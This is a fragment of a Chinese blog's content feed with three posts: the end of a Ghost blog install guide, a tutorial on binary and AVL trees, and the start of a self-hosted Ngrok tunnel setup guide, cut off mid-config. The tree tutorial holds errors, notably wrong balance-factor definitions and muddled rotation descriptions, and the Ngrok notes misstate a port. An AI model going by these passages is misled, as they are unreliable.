&#123;<br>        client: <span class="hljs-string">&#x27;mysql&#x27;</span><br>        connection: &#123;<br>            host     : <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>            user     : <span class="hljs-string">&#x27;ghost&#x27;</span>, <span class="hljs-comment"># 数据库连接的用户</span><br>            password : <span class="hljs-string">&#x27;123456Aa!&#x27;</span>, <span class="hljs-comment"># 先前创建的密码</span><br>            database : <span class="hljs-string">&#x27;ghost&#x27;</span>, <span class="hljs-comment"># 先前创建的数据库</span><br>            charset  : <span class="hljs-string">&#x27;utf8&#x27;</span><br>        &#125;,<br>    server: &#123;<br>            host: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>            port: <span class="hljs-string">&#x27;2368&#x27;</span> <span class="hljs-comment"># 若修改该端口记得在nginx中做相应改变</span><br>        &#125;<br>    &#125;  <br></code></pre></td></tr></table></figure><p>接下来下载 <code>Ghost</code> 所需要的依赖包：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org <br>npm info underscore（如果上面配置正确这个命令会有字符串response）<br>npm install --production --unsafe-perm<br></code></pre></td></tr></table></figure><blockquote><p> 上面代码的解释如下：</p></blockquote><ul><li><code>npm config set registry https://registry.npm.taobao.org</code> 是修改一下 <code>npm</code> 的镜像源，避免因为 <code>GFW</code> 而下载依赖包失败，其他修改方法见<a href="https://cnodejs.org/topic/4f9904f9407edba21468f31e" target="_blank">这里</a>；</li><li>添加 <code>--unsafe-perm</code> 的参数的原因是：如果我们不添加这个参数，会出现类似于 <code>npm WARN cannot run in wd test@0.0.0 echo something (wd=/Users/Lloyd/Documents/test)</code> 的错误，原因是如果使用 <code>root</code> 权限调用 <code>npm</code> ，那么它会将 <code>uid</code> 更改为用户配置指定的 <code>uid</code> ，默认为 <code>nobody</code> ，设置 <code> --unsafe-perm</code> 参数以使用 <code>root</code> 权限运行脚本；</li></ul><h2 id="1-5-开机后博客自动运行"><a href="#1-5-开机后博客自动运行" class="headerlink" title="1.5 开机后博客自动运行"></a>1.5 开机后博客自动运行</h2><p>安装 <code>PM2</code> 让 <code>Ghost</code> 可以在开机后自动后台运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm install -g cnpm --registry=https://registry.npm.taobao.org  <br>cnpm install pm2 -g  <br>NODE_ENV=production pm2 start index.js --name <span class="hljs-string">&quot;ghost&quot;</span>  <br>pm2 startup ubuntu <br>pm2 save<br></code></pre></td></tr></table></figure><p>我们需要打开 <code>/etc/rc.local</code> 文件在其中添加如下代码，让 <code>MySQL</code> 和 <code>Nginx</code> 开机自动运行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/etc/init.d/mysql restart<br>/etc/init.d/nginx restart<br></code></pre></td></tr></table></figure><h1 id="2-出现的一些问题"><a href="#2-出现的一些问题" class="headerlink" title="2.出现的一些问题"></a>2.出现的一些问题</h1><h2 id="2-1-config-js文件中的的URL配置https后，访问是浏览器提示重定向次数过多问题："><a href="#2-1-config-js文件中的的URL配置https后，访问是浏览器提示重定向次数过多问题：" class="headerlink" title="2.1 config.js文件中的的URL配置https后，访问是浏览器提示重定向次数过多问题："></a>2.1 config.js文件中的的URL配置https后，访问是浏览器提示重定向次数过多问题：</h2><p>之前就曾在安装完运行过程中发现网站的针对谷歌的复合搜索卡中的URL是http的，如果改成https，浏览器提示重定向次数过多。由于不妨碍使用，当时就没注意。</p><p>今天(<code>2017/06/03</code>) 在 Search Console 中发现 <code>我们在您的网站上未找到复合搜索卡的任何结构化数据。</code> 的提示信息。先通过谷歌的<a href="https://search.google.com/structured-data/testing-tool" target="_blank">结构化数据测试工具</a>检测了一番，发现我的复合搜索卡结构语法并没有错误，然后谷歌提供的<a href="https://support.google.com/webmasters/answer/6381755?#debugging" target="_blank">问题排查</a>，我发现是由于config.js文件中配置的是<a href="http://bugwz.com/">http://bugwz.com</a> ，而我在谷歌的Search Console中配置的是<a href="https://bugwz.com/">https://bugwz.com</a> ，导致Search Console 资源必须与托管网站不匹配，所以最后查阅一番，修正方法为在nginx的配置文件中的 <code>location /</code> 配置中加入如下代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxy_set_header X-Forwarded-Proto <span class="hljs-variable">$scheme</span>; //其中<span class="hljs-variable">$scheme</span>也可以直接写为https<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ghost </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树、二叉树、完全/满/平衡二叉树的理解与对比</title>
      <link href="/2017/05/01/tree/"/>
      <url>/2017/05/01/tree/</url>
      
        <content type="html"><![CDATA[<h2 id="一、树"><a href="#一、树" class="headerlink" title="一、树"></a>一、树</h2><p>树是一种重要的非线性数据结构，直观地看，它是数据元素（在树中称为结点）按分支关系组织起来的结构，很像自然界中的树那样。树型结构也是信息的重要组织形式之一，一切具有层次关系的问题都可用树来描述。</p><h3 id="1-1、相关概念"><a href="#1-1、相关概念" class="headerlink" title="1.1、相关概念"></a>1.1、相关概念</h3><ul><li><p><code>路径</code>：顺着节点的边从一个节点走到另一个节点，所经过的节点的顺序排列就称为路径；</p></li><li><p><code>根</code>：树顶端的节点称为根，一棵树只有一个根，如果要把一个节点和边的集合称为树，那么从根到其他任何一个节点都必须有且只有一条路径；</p></li><li><p><code>父节点</code>：若一个节点含有子节点，则这个节点称为其子节点的父节点；</p></li><li><p><code>子节点</code>：一个节点含有的子树的根节点称为该节点的子节点；</p></li><li><p><code>兄弟节点</code>：具有相同父节点的节点互称为兄弟节点；</p></li><li><p><code>叶节点</code>：没有子节点的节点称为叶节点，也叫叶子节点；</p></li><li><p><code>子树</code>：每个节点都可以作为子树的根，它和它所有的子节点、子节点的子节点等都包含在子树中；</p></li><li><p><code>节点的层次</code>：从根开始定义，根为第一层，根的子节点为第二层，以此类推；</p></li><li><p><code>深度</code>：对于任意节点n，n的深度为从根到n的唯一路径长，根的深度为0；</p></li><li><p><code>高度</code>：对于任意节点n，n的高度为从n到一片树叶的最长路径长，所有树叶的高度为0；</p></li><li><p><code>森林</code>：0个或多个不相交的树组成，对森林加上一个根，森林即成为树；删去根，树即成为森林；</p></li><li><p><code>节点的度</code>：节点拥有的子树的数目；</p></li><li><p><code>树的度</code>：树中节点的最大的度；</p></li></ul><ul><li><code>叶子节点</code>：度为零的节点；</li><li><code>分支节点</code>：度不为零的节点；</li><li><code>层次</code>：根节点的层次为<code>1</code>，其余节点的层次等于该节点的双亲节点的层次加<code>1</code>；</li><li><code>树的高度</code>：树中节点的最大层次；</li><li><code>无序树</code>：树中节点的各子树之间的次序是不重要的，可以交换位置；</li><li><code>有序树</code>：树中节点的各子树之间的次序是重要的，不可以交换位置；</li></ul><h3 id="1-2、定义"><a href="#1-2、定义" class="headerlink" title="1.2、定义"></a>1.2、定义</h3><ul><li>树是由一个或多个节点组成的有限集合；</li><li>树中必有一个特定的称为根的节点；</li><li>剩下的节点被分成 <code>n&gt;=0</code> 个互不相交的集合<code>T1</code>、<code>T2</code>、……<code>Tn</code>，并且这些每个集合又都是一个树。树<code>T1</code>、<code>T2</code>、……<code>Tn</code>被称作根的子树；</li></ul><h3 id="1-3、特点"><a href="#1-3、特点" class="headerlink" title="1.3、特点"></a>1.3、特点</h3><ul><li><strong>对比二叉树</strong><ul><li>树中节点的最大度数（节点的分叉）没有限制，而二叉树节点的最大度数（节点的分叉）数量为2；</li><li>树的节点无左、右之分，而二叉树的节点有左、右之分；</li></ul></li></ul><h3 id="1-4、表示方法"><a href="#1-4、表示方法" class="headerlink" title="1.4、表示方法"></a>1.4、表示方法</h3><p>树的表示方法有许多，常用的方法是用<strong>括号</strong>：</p><ul><li>先将根结点放入一对圆括号中，然后把它的子树由左至右的顺序放入括号中，而对子树也采用同样的方法处理；</li><li>同层子树与它的根节点用圆括号括起来，同层子树之间用逗号隔开，最后用闭括号括起来；</li></ul><h3 id="1-5、示例图"><a href="#1-5、示例图" class="headerlink" title="1.5、示例图"></a>1.5、示例图</h3><p><img src="/assets/images/tree.png" alt="树" loading="lazy"></p><p>如上图可使用<strong>括号表示法</strong>写成：<code>(A(B(E,F),C(G),D(H,M)))</code></p><h2 id="二、二叉树"><a href="#二、二叉树" class="headerlink" title="二、二叉树"></a>二、二叉树</h2><p>二叉树（Binary Tree）是包含<code>n</code>个节点的有限集合，当n为零时该集合为空集，或者该集合由一个根节点和两棵互不相交的、分别称为根节点的左子树和右子树的二叉树组成。</p><h3 id="2-1、定义"><a href="#2-1、定义" class="headerlink" title="2.1、定义"></a>2.1、定义</h3><ul><li>树中每个节点最多有两个子树，不存在度（分叉）大于2的节点；</li><li>子树有左右之分，次序不能颠倒；</li></ul><h3 id="2-2、基本形态"><a href="#2-2、基本形态" class="headerlink" title="2.2、基本形态"></a>2.2、基本形态</h3><ul><li><p>空二叉树</p></li><li><p>只有一个根结点的二叉树</p></li><li><p>只有右子树</p></li><li><p>只有左子树</p></li><li><p>完全二叉树：除了树的最后一层外，其他的节点既有左子树又有右子树；</p></li></ul><h3 id="2-3、示例图"><a href="#2-3、示例图" class="headerlink" title="2.3、示例图"></a>2.3、示例图</h3><p><img src="/assets/images/tree-binary-tree.png" alt="二叉树" loading="lazy"></p><h2 id="三、完全二叉树"><a href="#三、完全二叉树" class="headerlink" title="三、完全二叉树"></a>三、完全二叉树</h2><p>对于深度为 $k$ ，有 $n$ 个结点的二叉树，当且仅当其每一个结点都与深度为 $k$的满二叉树中编号从<code>1</code>至<code>n</code>的结点一一对应时称之为完全二叉树。</p><h3 id="3-1、定义"><a href="#3-1、定义" class="headerlink" title="3.1、定义"></a>3.1、定义</h3><ul><li>符合二叉树的定义规则；</li><li>除二叉树的最高层<code>h</code>外，其它各层 (<code>1</code>～<code>h-1</code>) 的节点数都达到最大个数；</li><li>第<code>h</code>层有叶子结点，并且叶子结点都是从左到右依次排布；</li></ul><h3 id="3-2、示例图"><a href="#3-2、示例图" class="headerlink" title="3.2、示例图"></a>3.2、示例图</h3><p><img src="/assets/images/tree-complete-binary-tree.png" alt="完全二叉树" loading="lazy"></p><h2 id="四、满二叉树"><a href="#四、满二叉树" class="headerlink" title="四、满二叉树"></a>四、满二叉树</h2><p>一个二叉树，如果每一个层的结点数都达到最大值，则这个二叉树就是满二叉树。也就是说，如果一个二叉树的层数为 $k$，且结点总数是 $2^k -1$ ，则它就是满二叉树。</p><h3 id="4-1、定义"><a href="#4-1、定义" class="headerlink" title="4.1、定义"></a>4.1、定义</h3><ul><li>符合完全二叉树的定义；</li><li>每个节点都有左右子叶并且叶子节点都处于最底层；</li></ul><h3 id="4-2、特点"><a href="#4-2、特点" class="headerlink" title="4.2、特点"></a>4.2、特点</h3><ul><li>满二叉树一定是平衡二叉树，平衡二叉树不一定是满二叉树；</li></ul><h3 id="4-3、示例图"><a href="#4-3、示例图" class="headerlink" title="4.3、示例图"></a>4.3、示例图</h3><p><img src="/assets/images/tree-full-binary-tree.png" alt="满二叉树" loading="lazy"></p><h2 id="五、平衡二叉树（AVL树）"><a href="#五、平衡二叉树（AVL树）" class="headerlink" title="五、平衡二叉树（AVL树）"></a>五、平衡二叉树（AVL树）</h2><p>平衡二叉树（又称<code>平衡二叉查找树</code>），由前苏联的数学家 <code>Adelse-Velskil</code> 和 <code>Landis</code> 在 <code>1962年</code>提出的高度平衡的二叉树，根据科学家的英文名也称为 <code>AVL树</code>。平衡二叉树的常用实现方法有<code>红黑树</code>、<code>AVL</code>、<code>替罪羊树</code>、<code>Treap</code>、<code>伸展树</code>等。 </p><p>最小二叉平衡树的节点的公式为<code>F(n)=F(n-1)+F(n-2)+1</code>，这个类似于一个递归的数列，可参考<code>Fibonacci数列</code>，公式解释为：</p><ul><li><code>1</code>是根节点；</li><li><code>F(n-1)</code>是左子树的节点数量；</li><li><code>F(n-2)</code>是右子树的节点数量；</li></ul><h3 id="5-1、特点"><a href="#5-1、特点" class="headerlink" title="5.1、特点"></a>5.1、特点</h3><ul><li>可以为空树；</li><li>左右子树的高度相差<code>不超过 1</code> （<code>平衡因子</code>的绝对值不超过<code>1</code>）的树，并且左右子数都是一个平衡二叉树；</li></ul><h3 id="5-2、平衡因子"><a href="#5-2、平衡因子" class="headerlink" title="5.2、平衡因子"></a>5.2、平衡因子</h3><ul><li><code>-1</code>：表示左子树比右子树高；</li><li><code>0</code>：表示右子树比左子树高；</li><li><code>1</code>：表示左子树和右子树等高；</li></ul><h3 id="5-3、示例图"><a href="#5-3、示例图" class="headerlink" title="5.3、示例图"></a>5.3、示例图</h3><p><img src="/assets/images/tree-balanced-binary-tree.png" alt="平衡二叉树" loading="lazy"></p><h3 id="5-4、失衡调整"><a href="#5-4、失衡调整" class="headerlink" title="5.4、失衡调整"></a>5.4、失衡调整</h3><p>平衡二叉树调整后，它的中序遍历的顺序是不会改变的。</p><h4 id="5-4-1、插入时的失衡调整"><a href="#5-4-1、插入时的失衡调整" class="headerlink" title="5.4.1、插入时的失衡调整"></a>5.4.1、插入时的失衡调整</h4><p>所有的不平衡情况中，都是按照<code>寻找最小不平衡树</code>  &#x3D;&gt; <code>寻找所属的不平衡类别</code>  &#x3D;&gt; <code>根据4种类别进行固定化程序的操作</code>；</p><h5 id="5-4-1-1、LL型调整（左子树过高）"><a href="#5-4-1-1、LL型调整（左子树过高）" class="headerlink" title="5.4.1.1、LL型调整（左子树过高）"></a>5.4.1.1、LL型调整（左子树过高）</h5><ul><li>首先找到最小不平衡的子树，再以其根节点向右旋转（向右旋转后相当于右面的子数的树高加1，而左面的子数的树高减1）；</li><li>旋转之后源根节点的左孩子作为新的根节点，<strong>原来根节点的左孩子作为新的根节点</strong>；</li><li>中序遍历对比：调整前：<code>123</code>；调整后：<code>123</code>；</li></ul><p><img src="/assets/images/tree-balanced-binary-tree-ll.png" alt="LL型调整" loading="lazy"></p><h5 id="5-4-1-2、RR型调整（右子树过高）"><a href="#5-4-1-2、RR型调整（右子树过高）" class="headerlink" title="5.4.1.2、RR型调整（右子树过高）"></a>5.4.1.2、RR型调整（右子树过高）</h5><ul><li>首先找到最小不平衡的子树，再以其根节点向左旋转（向右旋转后相当于左面的子数的树高加1，而右面的子数的树高减1）；</li><li>旋转之后源根节点的右孩子作为新的根节点，<strong>原来根节点的右孩子作为新的根节点</strong>；</li><li>中序遍历对比：调整前：<code>123</code>；调整后：<code>123</code>；</li></ul><p><img src="/assets/images/tree-balanced-binary-tree-rr.png" alt="RR型调整" loading="lazy"></p><h5 id="5-4-1-3、LR型调整（左子树过高）"><a href="#5-4-1-3、LR型调整（左子树过高）" class="headerlink" title="5.4.1.3、LR型调整（左子树过高）"></a>5.4.1.3、LR型调整（左子树过高）</h5><ul><li><p>以较高子树的根节点为中心向左进行旋转（示例图中为左子树较高，左子树的根为<code>节点1</code>），可以理解成先转换为<code>LL型</code>；</p></li><li><p>以原根节点为中心，向右旋转（实例图中以<code>节点3</code>为中心，向右旋转）；</p></li><li><p>调整之后，<strong>原来根节点的左孩子的右孩子作为新的根节点</strong>；</p></li><li><p>中序遍历对比：调整前：<code>123</code>；调整后：<code>123</code>；</p></li></ul><p><img src="/assets/images/tree-balanced-binary-tree-lr.png" alt="LR调整" loading="lazy"></p><h5 id="5-4-1-4、RL型调整（右子树过高）"><a href="#5-4-1-4、RL型调整（右子树过高）" class="headerlink" title="5.4.1.4、RL型调整（右子树过高）"></a>5.4.1.4、RL型调整（右子树过高）</h5><ul><li><p>以根节点的右孩子为中心向右进行旋转（示例图中为右子树较高，右子树的根为<code>节点3</code>），可以理解成先转换为<code>RR型</code>；</p></li><li><p>以原根节点为中心，向右旋转（示例图中以<code>节点1</code>为中心，向左旋转）；</p></li><li><p>调整之后，<strong>原来根节点的右孩子的左孩子作为新的根节点</strong>；</p></li><li><p>中序遍历对比：调整前：<code>123</code>；调整后：<code>123</code>；</p></li></ul><p><img src="/assets/images/tree-balanced-binary-tree-rl.png" alt="RL调整" loading="lazy"></p><h4 id="5-4-2、删除时的失衡调整"><a href="#5-4-2、删除时的失衡调整" class="headerlink" title="5.4.2、删除时的失衡调整"></a>5.4.2、删除时的失衡调整</h4><h5 id="5-4-2-1、LE型（左子树过高）"><a href="#5-4-2-1、LE型（左子树过高）" class="headerlink" title="5.4.2.1、LE型（左子树过高）"></a>5.4.2.1、LE型（左子树过高）</h5><ul><li>以下初始场景只会在删除时才会出现，删除后可按照<code>LL型</code>的调整策略进行调整；</li></ul><p><img src="/assets/images/tree-balanced-binary-tree-le.png" alt="LE调整" loading="lazy"></p><h5 id="5-4-2-2、RE型（右子树过高）"><a href="#5-4-2-2、RE型（右子树过高）" class="headerlink" title="5.4.2.2、RE型（右子树过高）"></a>5.4.2.2、RE型（右子树过高）</h5><ul><li>以下初始场景只会在删除时才会出现，删除后可按照<code>RR型</code>的调整策略进行调整；</li></ul><p><img src="/assets/images/tree-balanced-binary-tree-re.png" alt="RE调整" loading="lazy"></p><h2 id="六、数据对比"><a href="#六、数据对比" class="headerlink" title="六、数据对比"></a>六、数据对比</h2><table><thead><tr><th align="center">种类</th><th align="center">第 $n$ 层的节点数</th><th align="center">深度为 $n$ 的树节点数</th><th align="center">节点数为 $n$ 的树的高度</th></tr></thead><tbody><tr><td align="center">二叉树</td><td align="center">$2^{n-1}$ (最多)</td><td align="center">$2^n-1$ (最多)</td><td align="center">$\log_2(n+1)$ (最少)</td></tr><tr><td align="center">完全二叉树</td><td align="center">$2^{n-1}$ (最多)</td><td align="center">$2^n-1$ (最多)</td><td align="center"></td></tr><tr><td align="center">满二叉树</td><td align="center">$2^{n-1}$</td><td align="center">$2^n-1$</td><td align="center">$\log_2(n+1)$</td></tr><tr><td align="center">平衡二叉树</td><td align="center">$2^{n-1}$ (最多)，1 (最少)</td><td align="center">$2^n-1$ (最多)，$2^{n-1}-1+1$ (最少)</td><td align="center"></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Ngrok搭建私有的内网穿透服务器</title>
      <link href="/2017/04/27/ngrok-secure-tunnels-to-localhost/"/>
      <url>/2017/04/27/ngrok-secure-tunnels-to-localhost/</url>
      
        <content type="html"><![CDATA[<h2 id="一、关于Ngrok"><a href="#一、关于Ngrok" class="headerlink" title="一、关于Ngrok"></a>一、关于Ngrok</h2><p>Ngrok 是用Go语言写的一个反向代理软件，Ngrok 服务可以分配给你一个域名让你本地的web项目可供外网访问，Ngrok解决了内网穿透这十分棘手的问题，可以让我们不需要公网IP的情况下，轻松向他人展示本机的Web Demo等信息。Ngrok 官网本身还提供了公共服务，只需要注册一个帐号，运行它的客户端，就可以快速把内网映射出去,不过这么好的服务，没多久就被墙了,幸运的是，Ngrok的1.x的源码被公布了出来，我们可以利用它的源码去构建属于我们自己的Ngrok内网穿透服务器。</p><p>据官方所说由于 Ngrok 存在一些已知的问题，例如内存泄漏等对稳定使用影响较大，原文内容如下：</p><blockquote><p>DO NOT RUN THIS VERSION OF NGROK (1.X) IN PRODUCTION. Both the client and server are known to have serious reliability issues including memory and file descriptor leaks as well as crashes. There is also no HA story as the server is a SPOF. </p></blockquote><p>不过，当你使用了Ngrok之后，你绝对会对他赞不绝口，当你内网中的一台机器开着Ngrok时，即使那台机器突然断网了，只要电脑之后连接上了网络，Ngrok就会立马自动开始工作，很人性化。</p><h2 id="二、Linux下Ngrok服务器的搭建及客户端的生成"><a href="#二、Linux下Ngrok服务器的搭建及客户端的生成" class="headerlink" title="二、Linux下Ngrok服务器的搭建及客户端的生成"></a>二、Linux下Ngrok服务器的搭建及客户端的生成</h2><ul><li>服务器环境：CentOS 7.2 64位&#x2F;Ubuntu Server 16.04.1 LTS 64位</li><li>客户端环境：Windows 10 版本10.0.14393</li></ul><h3 id="2-1、搭建Ngrok服务器所必需的环境条件"><a href="#2-1、搭建Ngrok服务器所必需的环境条件" class="headerlink" title="2.1、搭建Ngrok服务器所必需的环境条件"></a>2.1、搭建Ngrok服务器所必需的环境条件</h3><ul><li>CentOS下的命令：<br>更新系统软件环境，并安装所需要的mercurial git gcc golang软件包：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum update<br>yum install mercurial git gcc golang<br></code></pre></td></tr></table></figure><ul><li>Ubuntu Server下的命令：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install build-essential golang mercurial git<br></code></pre></td></tr></table></figure><h3 id="2-2、下载Ngrok的源码"><a href="#2-2、下载Ngrok的源码" class="headerlink" title="2.2、下载Ngrok的源码"></a>2.2、下载Ngrok的源码</h3><p>假如我们当前处于&#x2F;root目录，然后我们需要从GitHub上面下载下来Ngrok的源码文件，下面提供三个link，一个官方地址(可能会报错)，一个第三方地址，一个是我Fork别人的。由于访问 github 不太顺畅，有可能下载的时候链接会中断，所以如果出错了就再运行一遍。执行完</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/inconshreveable/ngrok.git<br>git <span class="hljs-built_in">clone</span> https://github.com/tutumcloud/ngrok.git<br>git <span class="hljs-built_in">clone</span> https://github.com/CUBEGWZ/ngrok.git<br></code></pre></td></tr></table></figure><p>执行完上面的代码后，我们 <code>ls</code> 就可以发现&#x2F;root&#x2F;目录下存在一个ngrok目录。</p><h3 id="2-3、生成证书"><a href="#2-3、生成证书" class="headerlink" title="2.3、生成证书"></a>2.3、生成证书</h3><p>我们在此之前需要确定已经有一个域名可以成功的泛解析映射到目标服务器上了。由于我们下载的Ngrok源码是官方提供的，所以其中的SSL证书当然不是针对目前我们所拥有的域名的，所以我们需要为当前域名配置SSL证书，并把信息写入服务器文件中去，还有一点，我们之后编译客户端的时候也会将这些信息编译进客户端，客户端内的信息必须与服务器端的信息相一致。</p><p>此处假设我想让使用我的Ngrok服务的人们那里获得的域名形似为”*.ngrok.testbug.top”，那么接下来我的设置如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/ngrok<br><span class="hljs-comment">#这里修改为自己想要设置的域名变量，便于后面使用</span><br>NGROK_DOMAIN=<span class="hljs-string">&quot;ngrok.testbug.top&quot;</span><br><br>openssl genrsa -out rootCA.key 2048<br>openssl req -x509 -new -nodes -key rootCA.key -subj <span class="hljs-string">&quot;/CN=<span class="hljs-variable">$NGROK_DOMAIN</span>&quot;</span> -days 5000 -out rootCA.pem<br>openssl genrsa -out device.key 2048<br>openssl req -new -key device.key -subj <span class="hljs-string">&quot;/CN=<span class="hljs-variable">$NGROK_DOMAIN</span>&quot;</span> -out device.csr<br>openssl x509 -req -<span class="hljs-keyword">in</span> device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 5000<br></code></pre></td></tr></table></figure><p>然后我们会发现&#x2F;root&#x2F;ngrok目录下会多出六个文件，他们分别是”rootCA.key”,”rootCA.pem”,”rootCA.srl”,”device.key”,”device.csr”,”device.crt”，然后我们将”rootCA.pem”,”device.crt”,”device.key”这三个文件复制替换&#x2F;root&#x2F;ngrok&#x2F;assets&#x2F;images&#x2F;client&#x2F;tls&#x2F;目录下的三个文件，代码如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">\<span class="hljs-built_in">cp</span> rootCA.pem assets/images/client/tls/ngrokroot.crt -f<br>\<span class="hljs-built_in">cp</span> device.crt assets/images/server/tls/snakeoil.crt  -f<br>\<span class="hljs-built_in">cp</span> device.key assets/images/server/tls/snakeoil.key -f<br></code></pre></td></tr></table></figure><h3 id="2-4、生成服务器端-ngrokd-与编译客户端的ngrok"><a href="#2-4、生成服务器端-ngrokd-与编译客户端的ngrok" class="headerlink" title="2.4、生成服务器端 ngrokd 与编译客户端的ngrok"></a>2.4、生成服务器端 ngrokd 与编译客户端的ngrok</h3><p>进入&#x2F;root&#x2F;ngrok目录后创建服务器端的 ngrokd，代码如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/ngrok<br>make release-server<br></code></pre></td></tr></table></figure><p>如果提示下载失败，可能是因为链接国外的服务器会断线的问题，可重新运行一遍 make release-server 。执行成功后，我们可以在&#x2F;root&#x2F;ngrok&#x2F;bin&#x2F;目录下看到 ngrokd 这个文件，这个就是我们后面要开启的服务器端，现在先不要运行。</p><p>然后我们在&#x2F;root&#x2F;ngrok&#x2F;目录中使用交叉编译，编译出几个常用平台的客户端软件，代码如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">GOOS=linux GOARCH=amd64 make release-client<br>GOOS=windows GOARCH=amd64 make release-client<br>GOOS=linux GOARCH=arm make release-client<br></code></pre></td></tr></table></figure><p>编译后的文件存在于&#x2F;root&#x2F;ngrok&#x2F;bin&#x2F;目录中，他们分别在以自己的操作系统名命名的目录中。我们把生成的文件下载下来存在客户端即可。</p><p>需要注意的是，不同平台使用不同的 GOOS 和 GOARCH，其中GOOS是指编译出来的操作系统 (windows,linux,darwin) ；GOARCH是指对应的构架 (386,amd64,arm)，列表如下：</p><ul><li>Linux 平台 32 位系统：GOOS&#x3D;linux GOARCH&#x3D;386</li><li>Linux 平台 64 位系统：GOOS&#x3D;linux GOARCH&#x3D;amd64</li><li>Windows 平台 32 位系统：GOOS&#x3D;windows GOARCH&#x3D;386</li><li>Windows 平台 64 位系统：GOOS&#x3D;windows GOARCH&#x3D;amd64</li><li>MAC 平台 32 位系统：GOOS&#x3D;darwin GOARCH&#x3D;386</li><li>MAC 平台 64 位系统：GOOS&#x3D;darwin GOARCH&#x3D;amd64</li><li>ARM 平台：GOOS&#x3D;linux GOARCH&#x3D;arm</li></ul><h3 id="2-5、服务器端-ngrokd-与客户端的ngrok的运行测试"><a href="#2-5、服务器端-ngrokd-与客户端的ngrok的运行测试" class="headerlink" title="2.5、服务器端 ngrokd 与客户端的ngrok的运行测试"></a>2.5、服务器端 ngrokd 与客户端的ngrok的运行测试</h3><p>首先我们让服务器端的ngrok开始运行，代码如下所示（三选一即可）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#cd /root/ngrok</span><br><span class="hljs-comment">#NGROK_DOMAIN=&quot;ngrok.testbug.top&quot;</span><br><span class="hljs-comment">#只启用http连接</span><br>/root/ngrok/bin/ngrokd -domain=<span class="hljs-string">&quot;ngrok.testbug.top&quot;</span> -httpAddr=<span class="hljs-string">&quot;:6060&quot;</span> -httpsAddr=<span class="hljs-string">&quot;:6061&quot;</span> -tunnelAddr=<span class="hljs-string">&quot;:6062&quot;</span><br><span class="hljs-comment">#启用http和https连接</span><br>/root/ngrok/bin/ngrokd -domain=<span class="hljs-string">&quot;ngrok.testbug.top&quot;</span> -httpAddr=<span class="hljs-string">&quot;:6060&quot;</span> -httpsAddr=<span class="hljs-string">&quot;:6061&quot;</span> -tunnelAddr=<span class="hljs-string">&quot;:6062&quot;</span> -tlsKey=/root/ngrok/device.key -tlsCrt=/root/ngrok/device.crt<br><span class="hljs-comment">#如果想让服务器端在我们关闭了终端后依旧可以后台运行，选择下面这句代码，后台运行，启用http和https连接</span><br>/usr/bin/nohup /root/ngrok/bin/ngrokd -domain=<span class="hljs-string">&quot;ngrok.testbug.top&quot;</span> -httpAddr=<span class="hljs-string">&quot;:6060&quot;</span> -httpsAddr=<span class="hljs-string">&quot;:6061&quot;</span> -tunnelAddr=<span class="hljs-string">&quot;:6062&quot;</span> -tlsKey=/root/ngrok/device.key -tlsCrt=/root/ngrok/device.crt &gt; /root/ngrok/out.file 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>上面代码中的一些说明：</p><ul><li>httpAddr 是访问普通的http使用的端口号，客户端用 <a href="#">http:&#x2F;&#x2F;*.ngrok.testbug.top:6060</a> 来访问服务</li><li>httpsAddr 是访问的https使用的端口号,客户端用 <a href="#">https:&#x2F;&#x2F;*.ngrok.testbug.top:6060</a> 来访问服务</li><li>tunnelAddr 是通道的端口号，这个端口是Ngrok用来通信的，所以这个端口在服务器上和客户端上设置必须要对应才可以正常的链接，默认不填写好像是4433</li></ul><p>如果想要开机启动Ngrokd服务，并开启http和https连接服务，可以执行下面的操作：</p><ul><li>针对于CentOS中，在”&#x2F;etc&#x2F;rc.d&#x2F;rc.local”文件最后加入下面的代码：</li><li>针对于Ubuntu Server，在”&#x2F;etc&#x2F;rc.local”文件的最后加入下面的代码:</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/nohup /root/ngrok/bin/ngrokd -domain=<span class="hljs-string">&quot;ngrok.testbug.top&quot;</span> -httpAddr=<span class="hljs-string">&quot;:6060&quot;</span> -httpsAddr=<span class="hljs-string">&quot;:6061&quot;</span> -tunnelAddr=<span class="hljs-string">&quot;:6062&quot;</span> -tlsKey=/root/ngrok/device.key -tlsCrt=/root/ngrok/device.crt &gt; /root/ngrok/out.file 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>接下来我们配置客户端，以便于我们在客户端可以成功建立与服务器的连接，并且最终完成内网穿透的需求；</p><p>我们客户端的环境是Windows 10 版本10.0.14393，把下载下来的ngrok.exe文件放在绝对路径中没有中文的文件夹中，然后在该文件夹中新建一个”ngrok.cfg”，页面编码选择为”UTF-8 无BOM格式”，然后里面输入如下内容并保存：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">server_addr: <span class="hljs-string">&quot;ngrok.testbug.top:6062&quot;</span><br>trust_host_root_certs: <span 